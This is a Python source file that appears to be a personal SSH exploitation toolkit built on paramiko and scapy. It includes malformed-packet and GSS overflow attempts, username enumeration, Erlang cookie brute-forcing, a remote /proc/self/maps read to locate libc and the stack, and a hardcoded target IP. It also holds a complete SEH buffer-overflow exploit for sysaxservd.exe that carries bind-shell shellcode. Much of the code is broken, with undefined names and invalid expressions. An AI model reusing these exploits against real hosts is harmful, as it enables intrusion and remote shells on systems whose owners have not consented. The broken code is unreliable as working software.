#!/bin/env python
import main
from csv import Sniffer
import socket
import connect_listen
from scapy.all import DNS, DNSQR, IP, sr1, UDP, ICMP
from scapy.all import *
from icmplib import ping, multiping, traceroute, resolve
from datetime import datetime
import time
import random
from sys import argv
import xml.etree.ElementTree as ET
import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST
import logging
import math
import gssapi
from timeit import default_timer as timer
from pympler import muppy, summary
import hashlib
import binascii
from binascii import b2a_hex
from scipy import stats

old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# four errors, connect_listen.connect_listen(parameters)
# note to self that I want to find out what ssh libaries the session is using to generate brute_seed, and time if it matches then use the methods below
class exploits(connect_listen.connect_listen):
 def __init__(self,hostname, port, username, password ):
   super().__init__(hostname, port, username, password)

 def _TABLE():
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure
        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE:: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

 def get_connect(self, hostname, port, password, username):
    outer = connect_listen.connect_listen(hostname , port, password , username)
    return outer

 def info_dump(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   print(local)
   print(socket.recv(100))
   print(local._compression_info)
   print(local._cipher_info)
   print(local._get_latest_kex_init)
   print(local._channels)
   print(local._kex_info)
   print(local._key_info)
   print(local._mac_info)
   print(local.kex_engine)
   print(local.kexgss_ctxt)
   print(local._handler_table)
   print(local._channel_handler_table)
   print(local._channels)
   print(local.channel_events)
   print(local.channels_seen)
   print(local.get_server_key())
   print(f'Banner {local.get_banner()}')
   print(f'local._expected_packet{local._expected_packet}')
   print(f'local.default_max_packet_size{local.default_max_packet_size}')
   print(f'local.remote_cipher {local.remote_cipher}')
   print(f'local.remote_compression {local.remote_compression}')
   print(f'local.remote_mac {local.remote_mac}')
   print(f'remote_kex_init {local.remote_kex_init}')
 def channel_info(self):
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   socket.send(b'0x')
   # add known hosts to client
   # client = connect_listen.connect_listen.get_client(self)
   # client.get_host_keys().add(self.hostname, "ssh")

   #client.connect(self.hostname, self.port)
   #client.invoke_shell()
   for x in range(100):
    channel = paramiko.Channel(x)

    # channel.invoke_shell()
    print(channel._set_transport(local))
    local.open_channel("channel1")

    print(local._channel_counter)
    if channel.status_event == None: print(local._next_channel())
    if channel.status_event != None: print(channel._name)


 def malform_packet(self):
   #logging.getLogger("paramiko").setLevel(logging.ERROR)
   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)



   m = paramiko.Message()
   m.add_byte(cMSG_USERAUTH_REQUEST)
   m.add_string("ssh-userauth")

   local.packetizer.send_message(m)

   m = paramiko.Message()
   m.add_byte(cMSG_SERVICE_REQUEST)
   m.add_string("ssh-userauth")
   m.add_string("ssh-connection")
   m.add_string('publickey')
   m.add_boolean(True)
   m.add_string('ssh-ed25519')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15')
   m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

   local.packetizer.send_message(m)

   try:
    print(local.packetizer.read_all(n = 15, check_rekey=True))
   except:
    pass

 def memory_reg(self):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  channel = paramiko.Channel(0)
  buff = paramiko.buffered_pipe.BufferedPipe()
  buff_compare = paramiko.buffered_pipe.BufferedPipe()


  thread_buff = paramiko.buffered_pipe.threading

  print(thread_buff.main_thread())

  overflow = local.session_id

  buff_compare.feed(data =  b']\xe0P\x98B\x8dQ\xd4\x10\x83\xc4\xb9\xf0\x01IG\x7f\x8d6\x11\xa8\xec]\xd88\x90\x8fv\xe1\x8a\x96\xae')

  print("reading session id")
  buff.feed(data = overflow)
  print("buffer matrix")

  print(buff._buffer)
  print(buff_compare._buffer)

  print(len(overflow))
  hasha = hashlib.sha256()
  hasha.update(b'2b2d2a494679df40dfcbf1c11bbdd5cf64c5fc66cdc4be6a0a6c2d7467ede135')
  print(hasha.digest_size)
  print(hasha.block_size)

  print(stats.kendalltau(buff._buffer, buff_compare._buffer))



  print((local.session_id))
  print(binascii.hexlify(local.session_id).decode('utf8'))



  # USE ENTROPY ON SESSION ID TO SEE WHAT RANDOM VALUES ARE CREATED
  # REQUEST KEX AND THEN KEX IS THE SESSION ID
  # use local.session_id as a hash
  # DUMPING MEMORY


  all_objects = muppy.get_objects()
  sum1 = summary.summarize(all_objects)
  summary.print_(sum1)
  return binascii.hexlify(local.session_id).decode('utf8')

 def gss_overflow(self):
  socket = connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  gss = paramiko.GSSAuth(self.hostname, True)
  pack = paramiko.Packetizer(socket)


  gss_mic = gss._ssh_build_mic(local.session_id, "root", "", "keyex")
  m = paramiko.Message()
  print(m.add_string(gss_mic))

  pack.send_message(m)
  pack.read_all(n = 100)
 # channel = paramiko.Channel()




 def send_message(self):
   socket = self.get_connect("107.22.232.29", 22, None, None).socket_in()
   print("... getting message from recv_server")

   result = paramiko.message.Message()
   #answer = result.add_boolean(b = False).get_bytes(100)
   answer = result.add_string(s = b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')
   #print(answer)
   # print(socket.send ( b'\x00\x:00\x00\x0bssh-ed25519\x00\x00\x00\x0'))

     # create a new scapy packet right here then give the information and send to port 22
 def _debug(self):
   print("sniffing on port 22")
   os.system("tcpdump -s 0 port 22")

 def _challenge(self):
   s = connect_listen.connect_listen.socket_in(self)
   challenge = s.recv(1024)     # Receive "challenge" message
   challenge = struct.unpack(">I", challenge[9:13])[0]
   print(challenge)
   return challenge


 def _handlers(self):
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
  paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error


 def xml_overflow(self):
  socket = connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  print(local.channel_events)
   # local.open_channel("netconf")
  local.open_session()
  local.open_channel("channel-1")

  connect_listen.connect_listen.invoke_subsytem(self, "netconf")

  xml = "/home/ender/Desktop/interpy/xml_files/_1.xml" #xml document
  print(local.channels_seen)

  print("...compressing XML document")

  com = lzma.LZMACompressor(format=FORMAT_XZ, check=- 1, preset=None, filters=None)
  print(ET.tostring(xml, encoding='utf-8'))
  content = com.compress(xml)
  m = paramiko.Message()

  m.add(content)
  local.packetizer.send_message(m)
  print(local.packetizer.read_all(n = 100, check_reky= False))


 # Original Author: Milton Valencia (wetw0rk)
 def erlangcookie(self, *cookie):
   name_msg  = b"\x00 "
   name_msg += b"\x15"
   name_msg += b"n"
   name_msg += b"\x00\x07"
   name_msg += b"\x00\x03\x49\x9c"
   name_msg += b"AAAAAA@AAAAAAA"

   challenge_reply  = b"\x00\x15"
   challenge_reply += b"r"
   challenge_reply += b"\x01\x02\x03\x04"

   for c in cookie:
    challenge_reply += md5(bytes(c, "ascii") + self._challenge(), "ascii").digest() # argv is the erlang cookie

    connect_listen.connect_listen.socket_in(self).send(challenge_reply)
    if len(connect_listen.connect_listen.socket_in(self).recv(100)): print(f'[+] Cookie {c}')



 def ssl_overflow(self):
  c = cert()
  c.cert_gen() # overflow in email address
  info_arr = [b'emailaddress', b'commonName', b'NT']

 def x11forward(self, cmd = "xxxx\n?\nsource /etc/passwd\n"):

   socket = connect_listen.connect_listen.socket_in(self)
   local = connect_listen.connect_listen.socket_transport(self)
   session = local.open_session(window_size = 100)
   print(session.chanid)

   print(session.request_x11())
   session.send(cmd)


   # free pointer is made with do_ssh_kex which can cause ddos attacks
 def _pointer_denial(self):
    socket = connect_listen.connect_listen.socket_in(self)
    local = connect_listen.connect_listen.socket_transport(self)
    CLIENT_ID = "PuTTY_Release_0.64"

    local.local_version = f"SSH-2.0-{_clientid}"
    print(local.local_version)

    local.connect(username='', password='')


#  credit to @epi052
 def _userenum(self):
 # self.malform_packet()
  socket = connect_listen.connect_listen.socket_in(self)
  transport = connect_listen.connect_listen.socket_transport(self)
  socket.recv(1000)
  try:
   transport.auth_publickey(self.username, paramiko.RSAKey.generate(1024))
  except paramiko.ssh_exception.AuthenticationException:
   print(self.username)


 def cipher_memory(self, write):
  print("... dumping memory and finding key") # using shanons entropy to figure out what keys are what
  with open("ram.txt", 'rb+') as f:

   f.write(write)

   buffer_size = 100
   temp_key=f.read(buffer_size)
   temp_key_str=b2a_hex(temp_key)
   n = 2
   Dict = {}
   FREQ_ARR = []
   while len(FREQ_ARR) >= buffer_size:
    temp_key_list=[temp_key_str[i:i+n] for i in range(0, len(temp_key_str), n)]

    print(temp_key_list)
    counter = collections.Counter(temp_key_list)
    result = dict(counter)

    for value in result.values():
     freq = value / len(temp_key_list)
     print(freq * math.log(1/freq))
     FREQ_ARR.append(freq * math.log(1/freq))
     print(FREQ_ARR)

     if value in result.values() > 0.5:
      print("key has a high entropy ")

 # find a way to
 def malformed_gss(self):
  socket =  connect_listen.connect_listen.socket_in(self)
  local = connect_listen.connect_listen.socket_transport(self)
  #gss = paramiko.GSSAuth("gss-with-mic")
  # local.auth_gssapi_with_mic("root", self.hostname, False)
  # print(gss._session_id)
  # message = gss._ssh_build_mic(b"", b"root", b"gss-with-mic",b"")
  socket.recv(100)
  m = paramiko.Message()
  m.add(message)
  local._send_message(m)

 def rc4(self):
  print("[+] Requesting weak cipher")
  connect_listen.connect_listen.socket_in(self)
  connect_listen.connect_listen.preference(self, _pubkeys = None, _key = None, _compression = None, _kex = None, _macs = None, _cipher = 'aes128-ctr' )
  a = 0
  b = 0
  j = len("")
  for i in (j):
   a = (a + 1) % 256




 def sysax(self):
  egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05"
"\x5a\x74\xef\xb8\x44\x4e\x57\x50\x8b\xfa\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")
# msfpayload  windows/shell_bind_tcp LPORT=4444 R | msfencode -e -e x86/alpha_mixed X
  socket = connect_listen.connect_listen.socket_in(self)
  socket.bind((self.hostname, self.port))
  shell = ("DNWPDNWP"
"\x89\xe0\xda\xdf\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
"\x42\x75\x4a\x49\x69\x6c\x68\x68\x6d\x59\x77\x70\x57\x70"
"\x57\x70\x33\x50\x4f\x79\x39\x75\x70\x31\x7a\x72\x62\x44"
"\x4c\x4b\x52\x72\x70\x30\x6e\x6b\x32\x72\x44\x4c\x4c\x4b"
"\x36\x32\x74\x54\x6e\x6b\x71\x62\x34\x68\x64\x4f\x78\x37"
"\x42\x6a\x76\x46\x54\x71\x39\x6f\x35\x61\x49\x50\x4e\x4c"
"\x77\x4c\x61\x71\x31\x6c\x66\x62\x64\x6c\x75\x70\x39\x51"
"\x58\x4f\x34\x4d\x66\x61\x4f\x37\x6b\x52\x6c\x30\x73\x62"
"\x30\x57\x4c\x4b\x36\x32\x64\x50\x4c\x4b\x63\x72\x77\x4c"
"\x57\x71\x7a\x70\x6e\x6b\x61\x50\x72\x58\x6f\x75\x79\x50"
"\x61\x64\x50\x4a\x63\x31\x48\x50\x30\x50\x4c\x4b\x53\x78"
"\x56\x78\x6e\x6b\x50\x58\x51\x30\x35\x51\x59\x43\x69\x73"
"\x57\x4c\x73\x79\x4c\x4b\x47\x44\x6e\x6b\x47\x71\x79\x46"
"\x44\x71\x4b\x4f\x35\x61\x79\x50\x6c\x6c\x39\x51\x5a\x6f"
"\x76\x6d\x47\x71\x78\x47\x75\x68\x6b\x50\x33\x45\x39\x64"
"\x64\x43\x73\x4d\x4c\x38\x37\x4b\x31\x6d\x45\x74\x64\x35"
"\x39\x72\x32\x78\x4c\x4b\x30\x58\x45\x74\x47\x71\x48\x53"
"\x50\x66\x4c\x4b\x36\x6c\x42\x6b\x4e\x6b\x56\x38\x75\x4c"
"\x47\x71\x39\x43\x4e\x6b\x56\x64\x4e\x6b\x33\x31\x68\x50"
"\x6b\x39\x70\x44\x76\x44\x77\x54\x43\x6b\x71\x4b\x35\x31"
"\x36\x39\x30\x5a\x30\x51\x4b\x4f\x4d\x30\x70\x58\x31\x4f"
"\x42\x7a\x4c\x4b\x55\x42\x6a\x4b\x4d\x56\x63\x6d\x70\x68"
"\x50\x33\x36\x52\x45\x50\x67\x70\x70\x68\x31\x67\x31\x63"
"\x45\x62\x71\x4f\x31\x44\x61\x78\x52\x6c\x62\x57\x51\x36"
"\x53\x37\x59\x6f\x4b\x65\x6f\x48\x6e\x70\x56\x61\x67\x70"
"\x77\x70\x76\x49\x68\x44\x43\x64\x50\x50\x73\x58\x45\x79"
"\x6b\x30\x32\x4b\x65\x50\x49\x6f\x49\x45\x62\x70\x72\x70"
"\x76\x30\x70\x50\x53\x70\x66\x30\x67\x30\x46\x30\x45\x38"
"\x48\x6a\x36\x6f\x39\x4f\x59\x70\x39\x6f\x78\x55\x4e\x69"
"\x49\x57\x36\x51\x6b\x6b\x52\x73\x50\x68\x56\x62\x77\x70"
"\x66\x71\x31\x4c\x4f\x79\x6b\x56\x51\x7a\x36\x70\x72\x76"
"\x32\x77\x65\x38\x4b\x72\x6b\x6b\x64\x77\x71\x77\x4b\x4f"
"\x4e\x35\x50\x53\x56\x37\x73\x58\x6c\x77\x38\x69\x37\x48"
"\x69\x6f\x39\x6f\x78\x55\x63\x63\x30\x53\x31\x47\x62\x48"
"\x30\x74\x78\x6c\x57\x4b\x79\x71\x6b\x4f\x79\x45\x76\x37"
"\x4c\x49\x6f\x37\x55\x38\x73\x45\x72\x4e\x50\x4d\x43\x51"
"\x39\x6f\x59\x45\x73\x58\x42\x43\x50\x6d\x43\x54\x75\x50"
"\x4d\x59\x59\x73\x70\x57\x30\x57\x73\x67\x36\x51\x38\x76"
"\x51\x7a\x57\x62\x42\x79\x36\x36\x5a\x42\x6b\x4d\x31\x76"
"\x49\x57\x61\x54\x47\x54\x37\x4c\x67\x71\x53\x31\x4c\x4d"
"\x67\x34\x77\x54\x74\x50\x7a\x66\x37\x70\x51\x54\x52\x74"
"\x52\x70\x71\x46\x70\x56\x43\x66\x32\x66\x50\x56\x42\x6e"
"\x50\x56\x46\x36\x61\x43\x43\x66\x53\x58\x73\x49\x58\x4c"
"\x37\x4f\x4d\x56\x4b\x4f\x78\x55\x6f\x79\x69\x70\x30\x4e"
"\x50\x56\x51\x56\x39\x6f\x76\x50\x61\x78\x63\x38\x4e\x67"
"\x67\x6d\x71\x70\x59\x6f\x49\x45\x6d\x6b\x68\x70\x4f\x45"
"\x4e\x42\x62\x76\x72\x48\x4c\x66\x4e\x75\x6d\x6d\x6d\x4d"
"\x6b\x4f\x6a\x75\x37\x4c\x63\x36\x63\x4c\x45\x5a\x6f\x70"
"\x39\x6b\x39\x70\x52\x55\x37\x75\x6d\x6b\x63\x77\x75\x43"
"\x74\x32\x72\x4f\x51\x7a\x77\x70\x50\x53\x69\x6f\x38\x55"
"\x41\x41")
  padding1 = "\x90" * 50
  padding2 = "\x90" * 50
  nseh = "\x90\x90\xeb\x80"
  seh =  "\x69\x26\x40\x00"	#00402669 PPR sysaxservd.exe
  junk = "A" * (9204 - len(egghunter + padding1 + padding2 + shell))
  buff = junk + shell + padding1 + egghunter + padding2 + nseh + seh
  socket.sendall(buff)


# cause ssh buffer to overflow
 def parse_map(self):
  ssh = paramiko.SSHClient()
  sftp = ssh.open_sftp()
  log.info("Analysing /proc/self/maps on remote system") # map proc to a tensor
  sftp.get('/proc/self/maps','maps')
  with open("maps","r") as f:
    lines = f.readlines()
    for line in lines:
        words = line.split()
        addr = words[0]
        if ("libc" in line and "r-xp" in line):
           path = words[-1]
           addr = addr.split('-')
           BITS = 64 if len(addr[0]) > 8 else 32
           print("[+] {}bit libc mapped @ {}-{}, path: {}".format(BITS, addr[0], addr[1], path))
           libc_base = int(addr[0], 16)
           libc_path = path
        if ("[stack]" in line):
            addr = addr.split("-")
            saddr_start = int(addr[0], 16)
            saddr_end = int(addr[1], 16)
            print ("[+] Stack mapped @ {}-{}".format(addr[0], 1[addr]))
